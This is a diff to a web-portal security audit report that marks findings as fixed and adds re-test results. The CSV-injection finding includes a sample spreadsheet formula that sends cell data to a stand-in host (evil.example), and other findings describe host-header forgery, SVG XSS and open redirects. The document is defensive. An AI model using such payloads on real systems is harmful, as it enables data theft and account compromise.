@@ -116,7 +116,7 @@ Full detail: [`security/attack_surface.md`](security/attack_surface.md) · route
 | CWE / OWASP | CWE-1104 Use of unmaintained/vulnerable components · A06 Vulnerable and Outdated Components |
 | Affected | `frontend/package.json`: `next@16.2.1`, `next-auth@5.0.0-beta.30` (`@auth/core` ≤0.41.2) |
 | Confidence | **CONFIRMED-CODE** for the vulnerable versions (`npm audit`, `security/evidence/npm_audit_frontend.json`); **LIKELY** for exploitability of individual advisories |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10): §12 |
 
 **Description:** `npm audit --omit=dev` lists 12 vulnerable packages (3 critical). For Next.js:
 - several Middleware/Proxy bypasses (GHSA-492v-c6pp-mqqv, GHSA-267c-6grr-h53f, GHSA-26hh-7cqf-hhc6, GHSA-6gpp-xcg3-4w24);
@@ -189,7 +189,7 @@ For next-auth/@auth/core:
 | CWE / OWASP | CWE-79 Stored XSS, CWE-434 Unrestricted upload of dangerous type · A03 Injection |
 | Affected | `CompanyAuthController.php:40,81` and `CompanyProfileController.php:134,137`: `'company_logo' => ['required','file','mimes:jpg,jpeg,png,webp,svg','max:2048']` then `->store('company-logos', 'public')` |
 | Confidence | **CONFIRMED-CODE**: SVG accepted, kept with its `.svg` extension, no sanitiser anywhere (`grep sanitiz` → 0), served as static files with no `X-Content-Type-Options`, CSP or `Content-Disposition` (`security/evidence/P8_headers.txt`). **LIKELY**: script execution when the file URL is opened directly (needs the server to send `image/svg+xml`). No SVG was uploaded during the audit. |
-| Status | Open |
+| Status | **Fixed in code** in P-1 (2026-10-10); `/storage` headers still to be set on the web server: §12 |
 
 **Description:**
 - In the app, logos only appear inside `<img>`/`<Avatar>`, where SVG script doesn't run.
@@ -209,7 +209,7 @@ For next-auth/@auth/core:
 | CWE / OWASP | CWE-601 Open redirect · A01 Broken Access Control |
 | Affected | `frontend/app/auth/login/[type]/page.tsx:143` (`const callbackUrl = searchParams.get("callbackUrl") \|\| ""`) and `:195,200,204` (`router.replace(callbackUrl \|\| "/admin")` etc.); `frontend/app/auth/login/page.tsx:12-19` forwards the whole query string |
 | Confidence | **CONFIRMED-CODE**: no check that the value is a same-origin relative path. **LIKELY**: the router navigates to an absolute or protocol-relative URL (`https://…`, `//…`) after a successful login; not exercised live. |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10): §12 |
 
 **Description:**
 - `proxy.ts` itself only ever sets `callbackUrl` to the internal pathname, which is safe.
@@ -229,7 +229,7 @@ For next-auth/@auth/core:
 | CWE / OWASP | CWE-1236 Improper neutralisation of formula elements in a CSV file · A03 Injection |
 | Affected | `AdminFormReviewController::streamCsvDownload:1677-1692` (`fputcsv($output, $row)`); `csvValue:1694-1721` (returns `(string) $value` unchanged); rows built at `:364` (JNF) and `:535` (INF) from company-controlled values (company name, HR name, job title, `form_data` fields) |
 | Confidence | **CONFIRMED-CODE**: nothing neutralises `=`, `+`, `-`, `@`, tab or carriage return |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10): §12 |
 
 **Description:** a company can submit form fields beginning with `=` (e.g. `=HYPERLINK("https://evil.example/?d="&B2,"Click to verify")`). An admin who downloads the CSV and opens it in Excel or Sheets gets a live formula. The Phase 2 Excel exports are **not** affected: `ExportService::put()` (`:231-244`) writes every string with `setCellValueExplicit(..., TYPE_STRING)` (D87).
 
@@ -246,7 +246,7 @@ For next-auth/@auth/core:
 | CWE / OWASP | CWE-644 Improper neutralisation of HTTP headers, CWE-640 Weak password-recovery mechanism (same pattern) · A07 |
 | Affected | `CompanyAuthController.php:205` (`$apiOrigin = rtrim($request->getSchemeAndHttpHost(), '/')` used in the emailed link); no `trustHosts()` in `bootstrap/app.php` |
 | Confidence | **CONFIRMED-CODE**: the link origin comes from the request. **LIKELY**: a forged Host header reaches Laravel in production (depends on the reverse proxy's default server block); not exercised live because the endpoint's `email:rfc,dns` rule would need external DNS. |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10): §12 |
 
 **Description:**
 1. An attacker requests a verification link for `hr@victimcompany.com` with `Host: attacker.example`.
@@ -269,7 +269,7 @@ The password-reset link is **not** affected: it is built from `FRONTEND_URL` (`U
 | CWE / OWASP | CWE-307 Improper restriction of excessive authentication attempts, CWE-645 Overly restrictive account lockout · A07 · API2 |
 | Affected | `AppServiceProvider.php:41-53` (`api` 60/min per user or IP; `login` 10/min per account); `routes/api.php:45`; `frontend/auth.ts:37` (login request sent from the Next.js server) |
 | Confidence | **CONFIRMED-LIVE** (spray and lockout); **CONFIRMED-CODE** (shared IP) |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10); CAPTCHA not approved: §12 |
 
 **Proof of concept** (`security/poc/A3_3_bruteforce.sh` → `security/evidence/A3_3_bruteforce.txt`):
 - 50 wrong passwords against one QA student → 10×422 then 40×429. The **correct** password straight afterwards → 429, so the owner is locked out.
@@ -292,7 +292,7 @@ The password-reset link is **not** affected: it is built from `FRONTEND_URL` (`U
 | CWE / OWASP | CWE-522 Insufficiently protected credentials, CWE-1021/693 Missing protection mechanism · A05 |
 | Affected | `frontend/auth.ts:98-107` (`session.accessToken = token.accessToken`); `GET /api/auth/session`; `frontend/next.config.ts:4-25` (no CSP) |
 | Confidence | **CONFIRMED-LIVE**: `/api/auth/session` returned `accessToken` (Sanctum `id\|token`) to a logged-in student (`security/evidence/T4_3_T4_4_session.txt`); the frontend responses carry no CSP header (`security/evidence/P8_headers.txt`) |
-| Status | Open (Phase 1 A6, by design) |
+| Status | **Partly fixed** in P-1 (2026-10-10): baseline CSP in place; token handling unchanged (Phase 1 A6, by design): §12 |
 
 **Description:** no XSS sink reachable by attacker data was found. React escapes all stored text; the only `dangerouslySetInnerHTML` is Emotion CSS (`app/themeregistry.tsx:52`). But there's no second line of defence: any future XSS would read a 7-day API token with a single `fetch('/api/auth/session')`.
 
@@ -310,7 +310,7 @@ The password-reset link is **not** affected: it is built from `FRONTEND_URL` (`U
 | CWE / OWASP | CWE-799 Improper control of interaction frequency, CWE-770 · A04 Insecure Design · API4 Unrestricted Resource Consumption |
 | Affected | `AlumniOutreachController.php:75` (`Mail::to($submission->email)->send(...)` for any submitted address); `CompanyAuthController::sendRecruiterEmailVerificationLink:183-215` (`updateOrCreate` and send on every request, no cooldown); both behind only `throttle:api` (60/min per IP) |
 | Confidence | **CONFIRMED-CODE** |
-| Status | Open (Phase 1 A8) |
+| Status | **Fixed** in P-1 (2026-10-10) for the per-recipient cooldown; per-IP caps and CAPTCHA not approved: §12 |
 
 **Impact:**
 - Each IP can make the portal send about 60 emails a minute to arbitrary people. That harasses third parties and burns the sending quota.
@@ -327,7 +327,7 @@ The password-reset link is **not** affected: it is built from `FRONTEND_URL` (`U
 | CWE / OWASP | CWE-1104, CWE-93 CRLF injection · A06 |
 | Affected | `laravel/framework` v12.56.0: "CRLF injection in default email rule" (High) and "Temporary Signed URL Path Confusion" (Medium). `symfony/mime` v7.4.7: CVE-2026-45067 "Email Header / SMTP Command Injection via CRLF in Address" (High). (`security/evidence/composer_audit.txt`, 41 advisories in total.) |
 | Confidence | **CONFIRMED-CODE** for the vulnerable versions; **LIKELY** for applicability |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10): §12 |
 
 **Why this applies:** public endpoints validate user-supplied addresses with the default `email` rule (forgot-password, alumni outreach) and then mail them. Resume links and the private-disk `/storage/{path}` route rely on temporary signed URLs.
 
@@ -375,7 +375,7 @@ Most of the rest (guzzle, psr7, commonmark, yaml) is not reachable: the backend 
 | CWE / OWASP | CWE-294 Authentication bypass by capture-replay · A07 |
 | Affected | `CompanyAuthController::verifyRecruiterEmail:250-291` (re-renders success; the row is only consumed at registration) |
 | Confidence | **CONFIRMED-LIVE**: `AuthenticationTest::test_A3_9_verification_link_is_single_use` fails |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10): §12 |
 
 **Remediation:** mark the token consumed on first use (clear `token_hash` and keep `verified_at`), and extend the verified state independently of the link's lifetime (fixes Phase 1 B7 as well).
 
@@ -388,7 +388,7 @@ Most of the rest (guzzle, psr7, commonmark, yaml) is not reachable: the backend 
 | CWE / OWASP | CWE-613 · A07 |
 | Affected | `frontend/auth.ts:22-24` (no `maxAge`, so the default is 30 days); `backend/config/sanctum.php:50` (7 days) |
 | Confidence | **CONFIRMED-LIVE**: the session cookie `Expires` is 30 days after login (`security/evidence/T4_3_T4_4_session.txt`) |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10): §12 |
 
 **Impact:** after 7 days the admin and company shells look signed in but every call fails. The student shell signs out on 401 (D99). A stolen session cookie keeps the user's identity data for 30 days.
 
@@ -403,7 +403,7 @@ Most of the rest (guzzle, psr7, commonmark, yaml) is not reachable: the backend 
 | CWE / OWASP | CWE-693, CWE-200, CWE-524 · A05 |
 | Affected | every API response: `X-Powered-By: PHP/8.5.5`, `Cache-Control: no-cache, private` on personal-data JSON (not `no-store`), no `X-Content-Type-Options` or `X-Frame-Options`; `/storage/*` has none of them (`security/evidence/P8_headers.txt`); PHP `expose_php=On` |
 | Confidence | **CONFIRMED-LIVE** |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10) for responses Laravel sends; `expose_php`, `/storage` and HSTS are server settings: §12 |
 
 **Remediation:** a global middleware adding `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` and `Referrer-Policy`; `Cache-Control: no-store` on authenticated JSON; `expose_php=Off`; HSTS at the reverse proxy.
 
@@ -431,7 +431,7 @@ Most of the rest (guzzle, psr7, commonmark, yaml) is not reachable: the backend 
 | CWE / OWASP | CWE-829 Inclusion of functionality from an untrusted control sphere · A08 Software and Data Integrity Failures |
 | Affected | `frontend/components/forms/shared/pdfviewer.tsx:12` (`workerSrc = //unpkg.com/pdfjs-dist@${version}/build/pdf.worker.min.mjs`) |
 | Confidence | **CONFIRMED-CODE** |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10): §12 |
 
 **Remediation:** bundle the worker (`new URL('pdfjs-dist/build/pdf.worker.min.mjs', import.meta.url)`) so the CSP can be `'self'`-only.
 
@@ -444,7 +444,7 @@ Most of the rest (guzzle, psr7, commonmark, yaml) is not reachable: the backend 
 | CWE / OWASP | CWE-79 (`javascript:` URL), CWE-20 · A03 |
 | Affected | `PolicyDocumentController.php:41,79` (`'url' => ['required_if:type,link','nullable','string']`); `update()` keeps an old URL when the type switches to pdf without a file (`:86-93`); `frontend/components/forms/shared/declarationchecklist.tsx:283-289` builds an `<a>` in the DOM with `link.href = pdfUrl.url` for non-http values |
 | Confidence | **CONFIRMED-CODE**: no scheme check. **LIKELY**: execution of a `javascript:` URL in the company's browser via the DOM-built download link. The React-rendered `href`s are protected by React 19. |
-| Status | Open (Phase 1 C) |
+| Status | **Fixed** in P-1 (2026-10-10): §12 |
 
 **Impact:** an admin, or anyone holding an admin token, could plant script that runs in companies' sessions when they click Download.
 
@@ -476,7 +476,7 @@ Most of the rest (guzzle, psr7, commonmark, yaml) is not reachable: the backend 
 | CWE / OWASP | CWE-540, CWE-359 Exposure of private personal information · A05 |
 | Affected | `conclave/index.html` (5 personal mobile numbers, 8 `iitism.ac.in` email addresses); `log_filtered.txt` (developer path, SQL error output); `CDC/frontend/test-results/.last-run.json` |
 | Confidence | **CONFIRMED-CODE** (counts only, values never printed) |
-| Status | Open (Phase 1 A11, partly fixed: `PROJECT_STATUS.md` removed) |
+| Status | **Partly fixed** (2026-10-09): `conclave/` removed; `log_filtered.txt` and `frontend/test-results/.last-run.json` still tracked: §12 |
 
 **Remediation:** remove the artefacts from tracked files. Publish the conclave page from a separate repository with consent for the listed contacts.
 
@@ -489,7 +489,7 @@ Most of the rest (guzzle, psr7, commonmark, yaml) is not reachable: the backend 
 | CWE / OWASP | CWE-204, CWE-209 · A01 · API1 |
 | Affected | Company `PUT/PATCH /company/jnfs/{jnf}` and `/company/infs/{inf}` validate before checking ownership (422 instead of 404 for another company's IDs); autosave `exists:jnfs,id` (422 vs 404); route-model-binding 404 text differs from the custom "JNF not found."; `GET /admin/policy-documents/{id}` → 500 (`show()` missing) |
 | Confidence | **CONFIRMED-LIVE**: these are the only 6 anomalies in `security/evidence/authorization_matrix.md` |
-| Status | Open |
+| Status | **Fixed** in P-1 (2026-10-10): §12 |
 
 **Remediation:** check ownership before validating, use one 404 body everywhere, and remove `show` from the `apiResource` (`->except('show')`).
 
@@ -708,6 +708,69 @@ Most of the rest (guzzle, psr7, commonmark, yaml) is not reachable: the backend 
 | SEC-021 remove artefacts | S |
 | SEC-022 ownership before validation; remove policy `show` | S |
 | SEC-I01–I12 | S–M each |
+
+---
+
+## 12. Re-test Results (P-1 "Hardening", 2026-10-10)
+
+Re-test of the fixes the owner approved on 2026-10-09 and 2026-10-10 (milestone P-1 of Phase 3, branch `phase3`, pull request #1). Each item was fixed in its own commit with a failing test written first. Decisions are in `PHASE3_DECISIONS.md` (P3-D8 to P3-D28). Method as before: code review, automated tests and ordinary requests against the local stack; no attack tooling, no real mail.
+
+### 12.1 Finding status
+
+| ID | Sev | Status | What changed | Verified by |
+|---|---|---|---|---|
+| SEC-001 | High | **FIXED** | `next` 16.3.8 (pinned), `next-auth` 5.0.0-beta.32; unused `axios`, `date-fns`, `@mui/x-data-grid`, `smalot/pdfparser` removed | `npm audit --omit=dev --audit-level=high` exit 0 (was exit 1: critical `@auth/core`, high `next`/`axios`); build and e2e on 16.3.8 |
+| SEC-002 | Medium | **OPEN (owner)** | Not a code change. The owner has not confirmed the rotation. | — |
+| SEC-003 | Medium | **OPEN** (not in the approved list) | — | `AuthenticationTest::test_A3_1…`, `::test_A3_2…` still fail (group `qa-open`) |
+| SEC-004 | Medium | **FIXED in code** | `svg` removed from both logo rules; the rule sniffs content, so an SVG or HTML file renamed `.png` is refused too; frontend pickers updated | `UploadTest` (2). **Left:** `/storage/*` needs `nosniff` and a restrictive CSP in the web-server config |
+| SEC-005 | Medium | **FIXED** | shared `lib/safecallbackurl.js`, used by both login pages | unit tests (3); e2e "a callbackUrl to another site is ignored after login" passes, which settles the LIKELY part |
+| SEC-006 | Medium | **FIXED** | `CsvSafe::cell()` on every cell of the JNF/INF CSV; column order kept | `ExportInjectionTest` (2) |
+| SEC-007 | Medium | **FIXED** | verification link built from `APP_URL`; Laravel `TrustHosts` on, hosts from `APP_URL` + `TRUSTED_HOSTS` (exact names) | `AuthenticationTest::test_A3_9_verification_link_uses_configured_origin`, `::test_A3_9_trusted_hosts_…`; live in production mode: `Host: evil.example` → 400 |
+| SEC-008 | Medium | **FIXED** | Next.js signs the client IP (HMAC, `INTERNAL_PROXY_SECRET`); Laravel trusts it only with a valid signature; login has its own 600/min per-IP limit; the hard per-account lock became a short backoff | `LoginThrottleTest` (7), `FixF016LoginThrottleTest`; live HMAC interop. **Left:** production must run Next.js behind a reverse proxy that appends the real address to `X-Forwarded-For`; CAPTCHA not approved |
+| SEC-009 | Medium | **PARTLY FIXED** | baseline CSP on every page, no `'unsafe-eval'` in production, scripts and workers from this site only | `tests-unit/csp.test.mjs` (4); e2e header + no-violation check on the production build. **Left:** `'unsafe-inline'` (a nonce-based policy needs every page rendered dynamically); the API token is still readable by page JavaScript (Phase 1 A6, by design) |
+| SEC-010 | Medium | **FIXED** (cooldown) | one mail per address per 10 minutes on the recruiter verification link and the alumni confirmation; 429 + `Retry-After` | `MailAbuseTest` (2). Also new: daily recipient cap for student mail (`MailDailyCapTest`, 6). **Left:** per-IP daily caps and CAPTCHA not approved |
+| SEC-011 | Medium | **FIXED** | `laravel/framework` 12.69.3, `symfony/mime` and `symfony/mailer` 7.4.19 | `composer audit --locked`: 41 advisories → 3 low, all dev-only `symfony/yaml`; `--no-dev` passes; `HeaderInjectionTest` |
+| SEC-012 | Low | **OPEN** (not in the approved list) | — | `AuthenticationTest::test_A3_4_common_or_personal_passwords_are_rejected` still fails (`qa-open`) |
+| SEC-013 | Low | **OPEN** (not in the approved list) | — | `SessionTokenTest::test_T4_8_resume_link_handed_to_a_company_dies_…` still fails (`qa-open`) |
+| SEC-014 | Low | **FIXED** | the link works once; the address then stays verified for 24 hours (also fixes Phase 1 B7) | `AuthenticationTest::test_A3_9_verification_link_is_single_use` (now passes), `::test_A3_9_verified_address_outlives_the_link_lifetime` |
+| SEC-015 | Low | **FIXED** | NextAuth session `maxAge` = 7 days and the session ends when the API token does; admin and company helpers sign out on 401 | `SessionTokenTest::test_T4_5_…`; unit tests (3); live: cookie lifetime 7.00 days, revoked token → signed out |
+| SEC-016 | Low | **FIXED** (Laravel responses) | `SecurityHeaders` middleware: `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`; `no-store` on authenticated and signed-link responses; `X-Powered-By` removed | `HeadersTest` (2); live headers. **Left (server settings):** `expose_php=Off`, HSTS at the proxy, `/storage/*` headers |
+| SEC-017 | Low | **OPEN** (not in the approved list) | — | — |
+| SEC-018 | Low | **FIXED** | pdf.js worker bundled with the app | no `unpkg.com` in the frontend; live: policy PDF renders with the bundled worker under the CSP |
+| SEC-019 | Low | **FIXED** | link documents must be `https` URLs; a link turned into a PDF needs the file; the company checklist never uses a non-http, non-site address | `PolicyDocumentTest` (2) |
+| SEC-020 | Low | **OPEN** (not in the approved list) | — | — |
+| SEC-021 | Low | **PARTLY FIXED** | `conclave/` removed from the repository (housekeeping, 2026-10-09) | **Left:** `log_filtered.txt`, `frontend/test-results/.last-run.json` are still tracked |
+| SEC-022 | Low | **FIXED** | ownership is checked before validation on company JNF/INF update; one 404 body for a missing and a foreign form; no model class or id in any API 404; `policy-documents` has no `show` route (405, was 500) | `ExistenceOracleTest` (2); `AuthorizationMatrixTest` **0 violations** (was 6) |
+| SEC-I05 | Info | **PARTLY** | the four unused packages are gone | **Left:** the dead route `POST /api/company/uploads` |
+| — | — | **DONE** | hard-coded password removed from `CompanySeeder` (env value or random) | `SeederSecretsTest` (2) |
+
+SEC-023 and SEC-I01 to SEC-I12 (other than I05) are unchanged.
+
+### 12.2 Authorisation matrix (re-run)
+
+267 route/method pairs × 8 actors: 1,848 cells plus 36 cross-tenant and edge probes = **1,884 requests, 0 violations, 0 server errors** (it was 6 violations, all SEC-022). Evidence: `security/evidence/retest_p1_authorization_matrix.md`. The QA permission matrix (6 actors, 1,422 requests) also reports 0 violations: `qa/evidence/retest_p1_permission_matrix.md`.
+
+### 12.3 Gates
+
+| Gate | Result |
+|---|---|
+| `php artisan test --exclude-group=qa-open` | **710 passed** (10,339 assertions) |
+| `qa-open` group | 4 tests, failing on purpose: SEC-003 (2), SEC-012, SEC-013 |
+| Tests of the P-1 changes on MySQL (throwaway database) | 36 passed; `migrate:fresh --seed` and the demo seeder succeed on MySQL |
+| `npx tsc --noEmit` / `npm run lint` / `npm run test:unit` / `npm run build` | clean / 0 errors (76 warnings, unchanged) / 10 passed / exit 0 |
+| e2e against the production build | 9 passed (smoke 4, student and admin 5) |
+| `npm audit --omit=dev --audit-level=high` | exit 0 (2 low: `quill`) |
+| `composer audit --locked --no-dev` | exit 0 |
+
+Full detail: `qa/evidence/retest_p1_gates.txt`.
+
+### 12.4 Notes from the fix phase
+
+- **Deployment requirements created by these fixes:** the same `INTERNAL_PROXY_SECRET` in the backend and frontend environments; a reverse proxy in front of Next.js that appends the client address to `X-Forwarded-For`; `TRUSTED_HOSTS` if the API is reached by any name other than the one in `APP_URL`; a queue worker (mail over the daily cap waits for the next day); `expose_php=Off` and the `/storage/*` headers on the web server.
+- **Sessions:** everyone signed in before the SEC-015 change is signed out once.
+- **CSP and PDFs:** PDF responses (`*.pdf`, `/api/proxy-pdf`) are sent without the CSP header, because Chrome's built-in viewer shows a blank frame when the PDF itself carries the policy.
+- **Test suite on MySQL:** the suite is written for in-memory SQLite. Run as-is on MySQL it gives 702 passed and 8 failed; all 8 are assumptions inside the tests (array order from JSON columns or unordered rows, a hard-coded id, a SQLite `PRAGMA`), not product faults.
+- **Still needing an owner decision:** SEC-002 (rotation), SEC-003, SEC-012, SEC-013, SEC-017, SEC-020, and the items marked "not approved" above (CAPTCHA, per-IP mail caps, a nonce-based CSP, server-side token handling).
 
 ---
 
